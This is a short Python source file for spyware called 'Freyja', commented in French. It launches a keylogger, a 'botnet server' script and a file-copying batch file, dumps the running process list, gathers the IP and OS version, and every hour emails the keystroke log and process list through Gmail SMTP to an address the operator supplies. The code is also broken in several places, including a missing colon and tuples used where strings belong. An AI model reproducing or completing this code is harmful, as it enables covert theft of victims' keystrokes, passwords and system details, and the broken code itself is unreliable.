# Freyja v1.1.2.3

from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import socket
import datetime
import sys
from subprocess import Popen, PIPE, check_output
import subprocess
import time
import simplejson
import re
import platform
import shutil

# Call copyfile.bat
os.system('copyfile.bat')
# Call botnet server
os.system('server/server.py')

# Call la tasklist et l'enregistre dans output.txt
tasklist = os.system("tasklist")
with open("output.txt", "wb") as f:
    f.write(subprocess.check_output(['tasklist']))
    f.close()

# Call le keylogger
os.system('Logger.pyw')

# Prend l'ip
hostname = socket.gethostname()
myip = socket.gethostbyname(hostname)

# Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
#def on_press(key):
#    logging.info(str(key))
#    if key == Key.esc:
#        return False

osver = platform.platform()

# Fin du spyware
while True
    time.sleep(3600)
# Envois les données à une email.
    email_user = 'Votre E-mail'
    email_send = 'Votre E-mail'
    email_password = 'Votre Mot de Passe'
    subject = 'Keylogger', myip

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject, osver

    body = 'Python Keylogger réponse.'
    msg.attach(MIMEText(body, 'plain'))

    filename='key_log.txt', 'output.txt'
    attachment =open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, email_password)

    server.sendmail(email_user,email_send,text)
    server.quit()
